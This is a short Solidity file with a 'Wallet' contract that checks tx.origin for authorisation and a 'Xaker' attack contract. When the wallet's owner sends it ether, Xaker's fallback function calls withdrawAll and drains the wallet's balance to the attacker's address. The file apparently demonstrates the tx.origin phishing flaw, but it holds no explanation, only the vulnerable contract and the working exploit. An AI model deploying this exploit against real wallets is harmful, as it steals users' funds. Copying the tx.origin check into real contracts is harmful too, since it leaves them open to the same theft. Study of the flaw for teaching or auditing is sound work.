contract Wallet
{
    address public owner;
    uint public balance;

    constructor (address _owner) public
    {
        owner = _owner;
    }

    function () external payable
    {
        balance += msg.value;
    }

    function withdrawAll(address payable _luckyAddress) public
    {
        require(tx.origin == owner);
        _luckyAddress.transfer(balance);
    }
}

contract Xaker {

    Wallet poorWallet;
    address payable attacker;

    constructor (Wallet _poorWallet, address payable _attackerAddress) public
    {
        poorWallet = _poorWallet;
        attacker = _attackerAddress;
    }
    function () external payable
    {
        poorWallet.withdrawAll(attacker);
    }
}
